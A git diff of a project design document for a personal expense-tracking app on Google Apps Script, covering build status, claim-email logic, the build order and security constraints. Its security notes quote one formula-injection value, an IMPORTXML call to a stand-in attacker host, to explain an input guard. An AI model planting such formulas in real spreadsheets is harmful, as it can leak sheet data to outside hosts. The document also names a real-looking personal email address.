@@ -5,28 +5,76 @@ manually; the new account is built clean rather than transferred.
 
 ## State of play
 
-**Server code written, never executed.** Nothing is deployed. `node --check`
-passes on all of it, which proves syntax only — the first real run will find
-things it cannot.
+**The backend is live and verified.** Pushed to the new account, `bootstrap()`
+run and re-run, all six Script Properties set, and `smokeTest()` passed 40 checks
+against real Sheets and real Drive — one entry per section, each walked through
+every state and back, filenames and folders confirmed at each step, then
+`smokeCleanup()` removed every trace. Build order steps 1–6 are done.
+
+Locally, `npm run v2:test` runs the real source against stand-ins for Apps
+Script's services — 161 assertions covering all four sections, the revert path,
+the filename chain, the registry, both mail paths, send-once behaviour and the
+injection guards. Between the two, the only untested things left are the ones
+that need a UI.
+
+**Nothing is reachable from outside the editor.** There is no `doGet`/`doPost`,
+so no web app is deployed and the attack surface is zero until step 7.
 
 | File | Contains |
 |---|---|
 | `v2/Config.js` | Section config, common columns, Script Properties, filename rules |
-| `v2/Core.js` | Columns by header, `setStatus`, folder moves, filename suffix chain |
-| `v2/Entries.js` | `createEntry`, `initializeEntry`, validation, creation email |
-| `v2/Registry.js` | Self-populating supplier registry, fuzzy matching |
+| `v2/Core.js` | Columns by header, `setStatus`, folder moves, filename suffix chain, date validation, `withLock` |
+| `v2/Entries.js` | `createEntry`, `initializeEntry`, validation, IVA claim mail, more-info mail |
+| `v2/Registry.js` | Self-populating supplier registry, fuzzy matching, lookup |
+| `v2/Setup.js` | `bootstrap()`, `setupScriptProperties()`, `checkScriptProperties()` |
+| `v2/Smoke.js` | `smokeTest()` / `smokeCleanup()` — the live smoke test, run from the editor |
+| `v2/test/` | The harness. Local only — `.claspignore` keeps it out of the push |
 
 **Not written yet:** management module (edit / archive / hard delete / category
-lists), the web UI and custom form, Siri endpoint, OCR intake.
+lists), the web UI and custom form, Siri endpoint, OCR intake. There is no
+`doGet`/`doPost` yet, so nothing is reachable from outside the editor.
 
-**Blocked on:** the new Google account existing. Once it does, what is needed is
-the spreadsheet ID and a root Drive folder ID for `ROOT_FOLDER_ID`.
+**The new account** — address in `.env` as `V2_CLASP_ACCOUNT`, since this repo is
+public. Its Apps Script project is
+bound to the new spreadsheet, and `v2/.clasp.json` points at it — gitignored, so
+the script ID stays local. Push with `npm run v2:push`, which is isolated from
+the root project in both directions by the two `.claspignore` files. The
+Apps Script API must be enabled once on the account before any push works — see
+build order step 3.
+
+**The two accounts no longer share a login.** `clasp login` writes one global
+`~/.clasprc.json`, so a single default credential meant whichever account you
+logged in as last was the one both projects pushed to. The `v2:*` scripts now
+pass `--user v2`, a named credential holding the new account, while
+the root `clasp:*` scripts keep the default one for the old account. Log in once
+with `npm run v2:login`; check with `npm run v2:whoami`.
+
+**Next actual step: the web UI** — build order step 7. Listing and the status
+control, `doGet` serving one page, deployed restricted to the account. That is
+the first code with an outside surface, so it is also where `doGet` must check
+`Session.getEffectiveUser()` rather than trusting `access: MYSELF` (see
+Security).
+
+Re-running `bootstrap()` remains how you apply a config change: add a field to
+`SECTIONS`, push, re-run, and the column appears. That is how `Claim Emailed`
+was added after the sheets already existed.
+
+**Headers are generated, not typed.** `sectionHeaders()` derives each sheet's
+header row from `SECTIONS`, so the columns cannot drift from the code that
+resolves them by name. Adding a field is a config change plus a re-run.
+`bootstrap()` is idempotent — re-running it is also how you check the setup.
 
 **Old system is frozen.** The v1 `Code.js` at the repo root and the GitHub Pages
 page still serve the old account and must not be changed. `.claspignore` only
 tracks the root `Code.js`, so `v2/` cannot reach it by accident.
 
 **Open TODO in config:** Work's `Type` option list is proposed, not real.
+
+**Google Forms is gone from v2 entirely** — decided, not hedged. `onFormSubmit`,
+`installFormTrigger` and `sectionForSheet` have been deleted from `Entries.js`,
+and the build order no longer creates any. `createEntry()` is the only way a row
+is born. The new account has no forms to migrate; the custom form is a view in
+the web app, still to be built.
 
 ---
 
@@ -93,7 +141,8 @@ deploy paths into one. Costs ~1–2s of first paint. For a personal tool, worth 
    difference between sheets became a special case. Look columns up by header
    text once per load; adding or reordering a column then breaks nothing.
 3. **Entry creation is a function, not a trigger side effect.** `createEntry()`
-   is the single way a row is born. Form submit, Siri and OCR are adapters.
+   is the single way a row is born. The custom form, Siri and OCR are callers
+   of it. There is no trigger in v2 at all.
 4. **Never report success for work that failed.** Today a toggle returns
    `success: true` even when the file rename and email both failed. Every
    operation returns what actually happened, and the UI shows it.
@@ -370,28 +419,42 @@ Core
   archiveReason(section, reason)         rows to archive sheet, files to Archived
   resolveColumns(sheet)                  header name -> index, cached per load
 
-Adapters
-  onFormSubmit(e)      -> createEntry(...)
-  doPost (UI)          -> setStatus / archive / list        (signed in)
-  doPost (Siri)        -> createEntry only                  (device key)
-  ocrIntake(file)      -> createEntry(...)                  (later)
+Callers
+  google.script.run    -> createEntry / setStatus / archive / list  (signed in)
+  doPost (Siri)        -> createEntry only                          (device key)
+  ocrIntake(file)      -> createEntry(...)                          (later)
 ```
+
+There is no trigger anywhere. Nothing writes a row except `createEntry`, which
+is what makes "one code path per concern" hold rather than merely being stated.
 
 `setStatus` replaces four divergent toggle functions. What each transition does
 becomes config, not code:
 
-| | Rename receipt | Email |
-|---|---|---|
-| Work | prefix on `Claimed` | no |
-| IVA | prefix on `Claimed` | **on entry creation**, not on status change |
-| Health | prefix on `Claimed`, both files | no |
-| Income | n/a | no |
+| | Rename receipt | Email | v1 did |
+|---|---|---|---|
+| Work | prefix on `Claimed` | **on entry creation** | emailed on form submit |
+| IVA | prefix on `Claimed` | **on entry creation**, not on status change | emailed on toggle to Claimed |
+| Health | prefix on `Claimed`, both files | no | emailed the iCloud Shortcut — cancelled |
+| Income | n/a | no | no |
 
-**The IVA claim email moves to `createEntry`** — it fires when the receipt is
-uploaded rather than when the status changes. That decouples it from status
-entirely, so no transition has a side effect beyond renaming, and re-selecting a
-state can never re-send mail. Recipient becomes a Script Property rather than
-the hardcoded `jacqueline.eaton@nato.int`.
+**Claim emails move to `createEntry`** — they fire when the entry is made and
+its receipt is attached, rather than when the status changes. That decouples
+them from status entirely, so no transition has a side effect beyond renaming,
+and re-selecting a state can never re-send mail. Recipients become Script
+Properties rather than the hardcoded `jacqueline.eaton@nato.int`:
+`IVA_CLAIM_RECIPIENT` and `WORK_CLAIM_RECIPIENT`.
+
+**Work's claim email nearly got lost.** v1 mailed every work expense on form
+submission from `sendWorkExpenseEmail()`, receipt attached — and an earlier draft
+of this table recorded Work as sending no mail, with no reason given. It was an
+oversight, not a decision. Restored as an `emailOnCreate` config exactly like
+IVA's, so the two now share one code path. Health is the only section that
+genuinely loses its v1 mail, because that mail existed solely to drive the
+cancelled iCloud Shortcut.
+
+Both are gated: nothing is sent while required fields are blank or the receipt
+is still missing. An incomplete entry gets a "more info needed" note instead.
 
 Moving back to an earlier state reverses the rename. Because that is now the
 same code path as moving forward, it cannot drift the way four hand-written
@@ -497,7 +560,8 @@ space is urgent, permanent removal is a config switch.
 | Archive a category value | management | yes | yes |
 
 **Manage category values.** Add and remove the allowed values of a section's
-category field, which updates the linked form's dropdown. Works for Work's
+category field, which the form's dropdown reads directly — there is no form to
+keep in sync, which is most of what this used to cost. Works for Work's
 Expense Reason and Health's Patient; hidden for IVA and Income, which have no
 category.
 
@@ -556,6 +620,17 @@ because they only ever ask for the same few things.
 blank, `Receipt State` becomes `awaiting`, and an email arrives with a
 **completion link** that opens the form on that row.
 
+**Built.** `sendCompletionRequest()` fires from `initializeEntry` whenever a
+required field is blank *or* a document is still awaited. It lists what is
+outstanding, repeats what was captured, and links to the row. Until the web form
+exists the link points at the spreadsheet row; when the form is built, only that
+URL changes.
+
+It goes to **`COMPLETION_EMAIL_RECIPIENT`, which is deliberately not
+`IVA_CLAIM_RECIPIENT`** — this is a note to yourself and must never land in front
+of whoever processes claims. Both are Script Properties; the values live in
+`.env` as `V2_COMPLETION_EMAIL_RECIPIENT` and `V2_IVA_CLAIM_RECIPIENT`.
+
 So a mishearing costs one tap on a link rather than a failed capture. It is also
 why the registry must hold rather than guess: a blank you will see and fix beats
 a confident wrong match that silently corrupts the entry.
@@ -577,28 +652,74 @@ not automatic — means the same mishearing resolves next time.
 No secret ever reaches a public file. The Siri key lives in the Shortcut and in
 Script Properties, nowhere else.
 
+**Scopes are pinned in `appsscript.json`** rather than inferred, so widening
+them is a visible diff instead of a side effect of adding a line of code:
+`spreadsheets`, `drive`, `script.send_mail`. Mail goes through **`MailApp`, not
+`GmailApp`** — both send as you, but `GmailApp` asks for `https://mail.google.com/`,
+full read and write of the whole mailbox, which this code has no business
+holding. Adding `doGet` will need `userinfo.email` for `Session.getEffectiveUser()`.
+
+**Every value written to a sheet passes through `safeCellValue`.** A counterparty
+of `=IMPORTXML("http://evil.test","//x")` is stored as text, not executed. This
+covers `createEntry` and the registry — the two paths that write data that came
+from outside.
+
+Two constraints to respect when the Siri endpoint is built:
+
+- **`doPost` must not accept file columns.** `extractFileId` will take any Drive
+  ID out of a supplied string, and the script runs as you, so a key holder
+  passing a URL for a file of yours would have it renamed and moved into
+  HelpfulForms. Siri sends the core fields only; whitelist them explicitly
+  rather than passing its payload to `createEntry` unfiltered.
+- **One manifest, two deployments.** `webapp.access` is per project, not per
+  deployment, so opening it to `ANYONE_ANONYMOUS` for Siri also opens the UI
+  deployment. When that happens, `doGet` must check
+  `Session.getEffectiveUser().getEmail()` itself rather than relying on
+  `access: MYSELF` — or Siri gets its own separate Apps Script project.
+
 ---
 
 ## Build order
 
 Each step should leave the system working.
 
-1. **New account + storage confirmed.** Verify quota before anything else.
-2. **Spreadsheet** with the four sheets and the standard header spine.
-3. **Apps Script project**, bound to the sheet. `resolveColumns`, `SECTIONS`
-   config, `createEntry`, `setStatus`.
-4. **Four Forms**, fields matching the schema, linked to the sheets.
-5. **`installFormTrigger()`**, then submit one test entry per section.
-6. **Web UI** in the project. Deploy restricted to your account. Confirm
-   sign-in, listing, toggling, archiving.
-7. **Script Properties** via `setupScriptProperties()`, verify with
-   `checkScriptProperties()`.
-8. **Cutover** — see below.
-9. **Siri Shortcut** + second narrow deployment.
-10. **OCR intake.**
+1. **New account + storage confirmed** — done. Quota managed by hand.
+2. **Spreadsheet + bound Apps Script project** — done. `v2/.clasp.json` points
+   at it.
+3. **Enable the Apps Script API on the new account**, once, at
+   <https://script.google.com/home/usersettings>. A fresh Google account has it
+   off, and `clasp push` fails with "User has not enabled the Apps Script API"
+   until it is on. Note that `clasp pull` works without it, so a successful pull
+   is not evidence that push will work. Check the avatar before toggling — with
+   two accounts signed in it is easy to enable it on the wrong one.
+4. **Push, then run `bootstrap()`.** `bootstrap()` creates the four sheets,
+   their generated header spine, `Suppliers`, the Drive tree, and
+   `ROOT_FOLDER_ID`. The push needs `--force` whenever the manifest has changed:
+   clasp will not overwrite a remote manifest unprompted, and with no TTY that
+   prompt defaults to no and it reports only `Skipping push.` — which reads like
+   "nothing to do" rather than "I declined".
+5. **Script Properties**, verified with `checkScriptProperties()`. Before any
+   entry exists, because creating an entry can send mail and every upload needs
+   the root folder. Setting them in **Project Settings → Script Properties** is
+   preferred over `setupScriptProperties()`: a value typed into the editor UI
+   cannot be committed to a public repo by accident.
+6. **`smokeTest()` from the editor.** The editor can only run zero-argument
+   functions, so `v2/Smoke.js` wraps it: one entry per section, walked
+   through every state and back, checking filenames and folders in real Drive
+   at each step. `smokeCleanup()` then removes exactly the rows it made, their
+   files, and the registry entry it taught. Confirm this before building
+   anything on top.
+7. **Web UI**: listing and the status control. Deploy restricted to your
+   account. Confirm sign-in, listing, status changes, dates.
+8. **Custom form** as a view in the same app: fields rendered from `SECTIONS`,
+   file upload, registry autocomplete and prefill.
+9. **Management module**: edit, delete-to-archive, hard delete, category lists.
+10. **Cutover** — see below.
+11. **Siri Shortcut** + second narrow deployment.
+12. **OCR intake.**
 
-Steps 1–8 restore what you have today, cleanly. 9 and 10 are new capability and
-can wait.
+Steps 1–10 restore what you have today, cleanly. 11 and 12 are new capability
+and can wait.
 
 ## Cutover
 
@@ -633,12 +754,33 @@ stop.
 
 - **Keep `3-45` or revert to `3.45` in filenames?** One line in `Config.js`.
 - **Is `Invoiced` the state every Income row starts in?** If so its date is
-  manual, so the form must ask for it at submission.
-- **Income has no files** — so it has no folders and no filename suffixes. Does
-  it need a Drive presence at all, or is the sheet row the whole record?
+  manual, so the form must ask for it at submission. Today `initializeEntry`
+  stamps it with today's date when blank, which is probably wrong for a
+  backdated invoice.
 - **Can you advance to a state without its date yet**, or is the date required?
-- Exact current field names for Income — read from the sheet before building
-- IVA email recipient address for the new account
-- Whether the four sections should stay four Forms or become one with branching
+
+- **Work's `Type` option list** in `Config.js` is proposed, not taken from real
+  data. Confirm it against what you actually claim for.
 - Where OCR runs: Drive's built-in OCR vs an API, and how confident it needs to
   be before autofilling rather than prompting
+
+### Settled since
+
+- **Claim emails fire once, when the document is there, and at no other time.**
+  Work and IVA both mail on creation, gated on the entry being complete and its
+  document actually opening. A `Claim Emailed` column — present only in sections
+  that mail — is stamped after a successful send, so no caller can produce a
+  second claim however many times it runs. `sendPendingClaim(section, row)`
+  re-runs the same gate for a receipt that arrived later, which is the Siri case:
+  the entry defers at creation and the claim goes out when the file lands. The
+  stamp is written only after the send succeeds, so a failure leaves the claim
+  genuinely unsent rather than silently marked done.
+- **Google Forms** — removed from v2 entirely. Custom form in the web app.
+- **Income needs no Drive presence.** It has no `fileColumns`, so `bootstrap()`
+  creates no folders for it and `applyFileState` never asks for one. The sheet
+  row is the whole record.
+- **Income's field names** — moot. v2 defines its own header spine, generated
+  from `SECTIONS`, rather than inheriting v1's.
+- **IVA email recipient** — unchanged address, now a Script Property rather
+  than hardcoded. Value in `.env` as `V2_IVA_CLAIM_RECIPIENT`.
+- **Drive folder names** — `section.sheet`, so `Work/ IVA/ Health/ Income/`.
